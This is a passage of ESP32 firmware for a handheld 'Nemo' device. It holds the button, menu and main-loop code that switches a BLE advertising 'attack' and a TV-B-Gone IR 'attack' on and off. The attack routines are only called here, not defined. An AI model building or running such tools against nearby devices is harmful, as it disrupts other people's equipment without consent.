        digitalWrite(ledPin, HIGH);
        delay(100);
        digitalWrite(ledPin, LOW);
        delay(100);
        digitalWrite(ledPin, HIGH);
        delay(100);
        digitalWrite(ledPin, LOW);
      }
      else if (currentState == STATE_MAIN_MENU) {
        if (currentMainMenuOption == MENU_BLE_ATTACK) {
          currentState = STATE_DEVICE_MENU;
          showNemoDeviceMenu();
        }
        else if (currentMainMenuOption == MENU_TVBGONE_ATTACK) {
          currentState = STATE_TVBGONE_MENU;
          showNemoTVBGoneMenu();
        }
        else if (currentMainMenuOption == MENU_ABOUT) {
          currentState = STATE_ABOUT;
          showNemoAbout();
        }
        
        digitalWrite(ledPin, HIGH);
        delay(100);
        digitalWrite(ledPin, LOW);
      }
      else if (currentState == STATE_TVBGONE_REGIONS) {
        currentState = STATE_TVBGONE_ACTIVE;
        tvb_stats.is_active = true;
        tvb_stats.codes_sent = 0;
        showNemoTVBActive();
      }
    }
  }
  
  if (etatBouton == HIGH && dernierEtatBouton == LOW) {
    debounceTime = currentTime;
    lastReleaseTime = currentTime;
    
    unsigned long pressDuration = currentTime - lastPressTime;
    
    if (pressDuration > 50 && pressDuration < 300) {
      waitingForSecondPress = true;
    } else if (pressDuration >= 3000) {
      waitingForSecondPress = false;
      handleLongPress();
    }
  }
  
  if (waitingForSecondPress && (currentTime - lastReleaseTime) > DOUBLE_PRESS_DELAY) {
    waitingForSecondPress = false;
    handleSinglePress();
  }
  
  dernierEtatBouton = etatBouton;
}

void handleSinglePress() {
  if (currentState == STATE_MAIN_MENU) {
    currentMainMenuOption = (currentMainMenuOption + 1) % MENU_TOTAL;
    showNemoMainMenu();
    
    digitalWrite(ledPin, HIGH);
    delay(30);
    digitalWrite(ledPin, LOW);
  }
  else if (currentState == STATE_DEVICE_MENU) {
    currentDeviceIndex = (currentDeviceIndex + 1) % TOTAL_DEVICES;
    
    if (currentDeviceIndex >= scrollOffset + VISIBLE_ITEMS) {
      scrollOffset++;
    } else if (currentDeviceIndex < scrollOffset) {
      scrollOffset--;
    }
    
    if (scrollOffset < 0) scrollOffset = 0;
    if (scrollOffset > TOTAL_DEVICES - VISIBLE_ITEMS) scrollOffset = TOTAL_DEVICES - VISIBLE_ITEMS;
    
    showNemoDeviceMenu();
    
    digitalWrite(ledPin, HIGH);
    delay(30);
    digitalWrite(ledPin, LOW);
  } 
  else if (currentState == STATE_TVBGONE_MENU) {
    currentState = STATE_TVBGONE_REGIONS;
    showNemoTVBRegions();
  }
  else if (currentState == STATE_TVBGONE_REGIONS) {
    currentRegion = (currentRegion + 1) % REGION_TOTAL;
    tvb_stats.current_region = currentRegion;
    showNemoTVBRegions();
    
    digitalWrite(ledPin, HIGH);
    delay(30);
    digitalWrite(ledPin, LOW);
  }
  else if (currentState == STATE_TVBGONE_ACTIVE) {
    tvb_stats.is_active = false;
    currentState = STATE_TVBGONE_MENU;
    showNemoTVBGoneMenu();
  }
  else if (currentState == STATE_INACTIVE) {
    isActive = true;
    currentState = STATE_ACTIVE;
    digitalWrite(ledPin, HIGH);
    updateNemoStatus(true);
  }
  else if (currentState == STATE_ACTIVE) {
    isActive = false;
    currentState = STATE_INACTIVE;
    pAdvertising->stop();
    digitalWrite(ledPin, LOW);
    updateNemoStatus(false);
  }
  else if (currentState == STATE_ABOUT) {
    currentState = STATE_MAIN_MENU;
    showNemoMainMenu();
    
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
  }
}

void handleLongPress() {
  if (currentState == STATE_TVBGONE_REGIONS) {
    currentState = STATE_TVBGONE_ACTIVE;
    tvb_stats.is_active = true;
    tvb_stats.codes_sent = 0;
    showNemoTVBActive();
  }
  else if (currentState == STATE_TVBGONE_ACTIVE) {
    tvb_stats.is_active = false;
    currentState = STATE_TVBGONE_MENU;
    showNemoTVBGoneMenu();
  }
  else if (currentState == STATE_ACTIVE) {
    pAdvertising->stop();
    digitalWrite(ledPin, LOW);
  }
  
  if (currentState != STATE_ABOUT) {
    currentState = STATE_MAIN_MENU;
    isActive = false;
    tvb_stats.is_active = false;
    showNemoMainMenu();
  }
  
  for (int i = 0; i < 3; i++) {
    digitalWrite(ledPin, HIGH);
    delay(100);
    digitalWrite(ledPin, LOW);
    delay(100);
  }
}

// ========== SETUP И LOOP ==========

void setup() {
  Serial.begin(115200);
  delay(100);
  
  Serial.println("[+] Nemo Minimal UI Firmware v5.0");
  Serial.println("[+] Display: 240x320 Simple UI");
  Serial.println("[+] Total BLE devices: " + String(TOTAL_DEVICES));
  
  pinMode(boutonBoot, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW);
  
  initNemoDisplay();
  initTouchscreen();
  initTVBGone();
  
  showNemoMainMenu();

  pinMode(IR_PIN, OUTPUT);
  
  BLEDevice::init("NEMO-BLE-IR");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  
  Serial.println("[+] System ready - BLE + TV-B-Gone Hybrid");
  Serial.println("[+] Touch screen or use BOOT button");
  Serial.println("[+] Hold button 3s: Main menu");
}

void loop() {
  digitalWrite(IR_PIN, HIGH);
  
  handleButton();
  checkTouch();
  handleTouchInput();
  
  // BLE атака
  if (currentState == STATE_ACTIVE && isActive) {
    static uint32_t last_packet = 0;
    
    if (millis() - last_packet >= (delaySeconds * 1000)) {
      sendAttackPacket();
      last_packet = millis();
      
      static bool ledState = true;
      digitalWrite(ledPin, ledState);
      ledState = !ledState;
    }
  }
  
  // TV-B-Gone атака
  if (currentState == STATE_TVBGONE_ACTIVE && tvb_stats.is_active) {
    processTVBGoneAttack();
    
    static bool tvbLed = true;
    digitalWrite(ledPin, tvbLed);
    tvbLed = !tvbLed;
  }
  
  // Обновление статистики BLE
  static uint32_t last_stats_update = 0;
  if (millis() - last_stats_update >= 1000) {
    if (currentState == STATE_INACTIVE || currentState == STATE_ACTIVE) {
      updateNemoStats();
    }
    last_stats_update = millis();
  }
  
  // Обновление статистики TV-B-Gone
  if (currentState == STATE_TVBGONE_ACTIVE) {
    static uint32_t last_tv_update = 0;
    if (millis() - last_tv_update >= 500) {
      updateNemoTVBStats();
      last_tv_update = millis();
    }
  }
  
  delay(10);
}
